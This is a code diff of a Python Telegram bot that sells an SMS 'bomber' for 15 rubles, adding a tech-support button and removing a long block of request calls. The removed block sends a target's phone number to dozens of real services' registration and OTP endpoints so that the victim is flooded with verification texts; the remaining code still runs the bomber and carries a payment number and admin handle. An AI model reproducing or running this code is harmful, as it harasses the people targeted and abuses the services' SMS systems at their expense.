@@ -31,7 +31,8 @@ def joke(message):
     markup = types.ReplyKeyboardMarkup(resize_keyboard = True)
     item1 = types.KeyboardButton('Бомбер')
     item2 = types.KeyboardButton('Давай еще одну')
-    markup.add(item1,item2)
+    item3 = types.KeyboardButton("Тех. поддержка")
+    markup.add(item1,item2,item3)
 
     bot.send_message(message.chat.id, text=[i[1] for i in record], reply_markup=markup)
 
@@ -122,219 +123,6 @@ def bomber(message):
     except:
         bot.send_message(message.chat.id, "Выполнено 11%")
 
-    try:
-        requests.get('https://www.oyorooms.com/api/pwa/generateotp?phone='+phone9+'&country_code=%2B7&nod=4&locale=en')
-    except:
-        pass
-
-    try:
-        requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCodeForOtp', params={'pageName': 'loginByUserPhoneVerification', 'fromCheckout': 'false','fromRegisterPage': 'true','snLogin': '','bpg': '','snProviderId': ''}, data={'phone': phone,'g-recaptcha-response': '','recaptcha': 'on'})
-    except:
-        pass
-
-    try:
-        requests.post('https://newnext.ru/graphql', json={'operationName': 'registration', 'variables': {'client': {'firstName': 'Иван', 'lastName': 'Иванов', 'phone': phone,'typeKeys': ['Unemployed']}},'query': 'mutation registration($client: ClientInput!) {''\n  registration(client: $client) {''\n    token\n    __typename\n  }\n}\n'})
-
-    except:
-        pass
-
-    try:
-        requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': phone})
-
-    except:
-        pass
-
-    try:
-        requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/', json={'client_type': 'personal', 'email': _email, 'mobilephone': phone, 'deliveryOption': 'sms'})
-
-    except:
-        pass
-
-    try:
-        requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': phone})
-
-    except:
-        pass
-
-    try:
-        requests.post('https://online.sbis.ru/reg/service/', json={'jsonrpc':'2.0','protocol':'5','method':'Пользователь.ЗаявкаНаФизика','params':{'phone':phone},'id':'1'})
-
-    except:
-        pass
-
-    try:
-        requests.post('https://ib.psbank.ru/api/authentication/extendedClientAuthRequest', json={'firstName':'Иван','middleName':'Иванович','lastName':'Иванов','sex':'1','birthDate':'10.10.2000','mobilePhone': phone9,'russianFederationResident':'true','isDSA':'false','personalDataProcessingAgreement':'true','bKIRequestAgreement':'null','promotionAgreement':'true'})
-        bot.send_message(message.chat.id, "Выполнено 22%")
-    except:
-        bot.send_message(message.chat.id, "Выполнено 23%")
-
-    try:
-        requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': phone})
-
-    except:
-        pass
-
-    try:
-        requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': phone})
-
-    except:
-        pass
-
-    try:
-        requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + phone})
-
-    except:
-        pass
-
-    try:
-        requests.post("https://api.carsmile.com/",json={"operationName": "enterPhone", "variables": {"phone": phone},"query": "mutation enterPhone($phone: String!) {\n  enterPhone(phone: $phone)\n}\n"})
-    except:
-        pass
-    try:
-        requests.post('https://www.citilink.ru/registration/confirm/phone/+' + phone + '/')
-
-    except:
-        pass
-    try:
-        requests.post("https://api.delitime.ru/api/v2/signup",data={"SignupForm[username]": phone, "SignupForm[device_type]": 3})
-
-    except:
-        pass
-
-    try:
-        requests.get('https://findclone.ru/register', params={'phone': '+' + phone})
-
-    except:
-        pass
-
-    try:
-        requests.post("https://guru.taxi/api/v1/driver/session/verify",json={"phone": {"code": 1, "number": phone}})
-
-    except:
-        pass
-
-    try:
-        requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',data={'msisdn': phone, "locale": 'en', 'countryCode': 'ru','version': '1', "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
-
-    except:
-        pass
-
-    try:
-        requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru",data={"mode": "request", "phone": "+" + phone,"phone_permission": "unknown", "stream_id": 0, "v": 3, "appversion": "3.20.6","osversion": "unknown", "devicemodel": "unknown"})
-
-    except:
-        pass
-
-    try:
-        requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword", data={"password": password, "application": "lkp", "login": "+" + phone})
-
-    except:
-        pass
-
-    try:
-        requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate',json={"phone": phone})
-
-    except:
-        pass
-
-    try:
-        requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6",data={"phone": phone})
-
-    except:
-        pass
-
-    try:
-        requests.post('https://lenta.com/api/v1/authentication/requestValidationCode',json={'phone': '+' + phone})
-
-    except:
-        pass
-
-    try:
-        requests.post('https://cloud.mail.ru/api/v2/notify/applink',json={"phone": "+" + phone, "api": 2, "email": "email","x-email": "x-email"})
-    except:
-        pass
-
-    try:
-        requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode',params={"pageName": "registerPrivateUserPhoneVerificatio"},data={"phone": phone, "recaptcha": 'off', "g-recaptcha-response": ""})
-
-    except:
-        pass
-
-    try:
-        requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",data={"st.r.phone": "+" + phone})
-    except:
-        pass
-
-    try:
-        requests.post('https://plink.tech/register/',json={"phone": phone})
-        bot.send_message(message.chat.id, "Выполнено 75%")
-    except:
-        bot.send_message(message.chat.id, "Выполнено 75%")
-
-    try:
-        requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code",json={"phone": phone})
-
-    except:
-        pass
-
-    try:
-        requests.post("http://smsgorod.ru/sendsms.php",data={"number": phone})
-
-    except:
-        pass
-
-    try:
-        requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',data={'phone_number': phone})
-
-    except:
-        pass
-
-    try:
-        requests.post('https://passport.twitch.tv/register?trusted_request=true',json={"birthday": {"day": 11, "month": 11, "year": 1999},"client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,"password": password, "phone_number": phone,"username": username})
-
-    except:
-        pass
-
-    try:
-        requests.post('https://cabinet.wi-fi.ru/api/auth/by-sms', data={'msisdn': phone},headers={'App-ID': 'cabinet'})
-    except:
-        pass
-
-    try:
-        requests.post("https://api.wowworks.ru/v2/site/send-code",json={"phone": phone, "type": 2})
-
-    except:
-        pass
-
-    try:
-        requests.post('https://eda.yandex/api/v1/user/request_authentication_code',json={"phone_number": "+" + phone})
-
-    except:
-        pass
-
-    try:
-        requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': phone})
-        bot.send_message(message.chat.id, "Выполнено 95%")
-    except:
-        bot.send_message(message.chat.id, "Выполнено 95%")
-
-    try:
-        requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',json={"client_type": "personal", "email": f"{_email}@gmail.ru","mobilephone": phone, "deliveryOption": "sms"})
-
-    except:
-        pass
-
-    try:
-        requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode",data={"phone": phone})
-    except:
-        pass
-
-    try:
-        requests.post('https://www.delivery-club.ru/ajax/user_otp', data={"phone": phone})
-
-    except:
-        pass
-
 
     bot.send_message(message.chat.id, "Выполнено!")
 
@@ -348,9 +136,9 @@ def answer(message):
                 if message.from_user.username in admin:
                     phone(message)
                 else:
-                    bot.send_message(message.chat.id, "Пришлите 15р по таким на реквезиты **********\nВ сообщение укажите имя пользователя (@***)")
+                    bot.send_message(message.chat.id, "Пришлите 15р по таким на реквизиты 89283248788\nВ сообщение укажите имя пользователя (@***)")
             else:
-                bot.send_message(message.chat.id, "Пришлите 15р по таким на реквезиты **********\nВ сообщение укажите имя пользователя (@***)")
+                bot.send_message(message.chat.id, "Пришлите 15р по таким на реквизиты 89283248788\nВ сообщение укажите имя пользователя (@***)")
         elif message.text.split()[0] == "!add" and message.from_user.username == "nechyrkaser": #Имя пользователя для админки
             admin.append(message.text.split()[1])
         elif message.text.split()[0] == "!remove":
@@ -358,7 +146,8 @@ def answer(message):
                 admin.remove(message.text.split()[1])
             else:
                 bot.send_message(message.chat.id, "Такого пользователя итак нет!")
-
+        elif message.text == "Тех. поддержка":
+            bot.send_message(message.chat.id, "Если у вас возникли вопросы по боту, то напишите сюда\n->  @nechyrkaser")
 @bot.callback_query_handler(func = lambda call: True)
 def callback(call):
     if call.message:
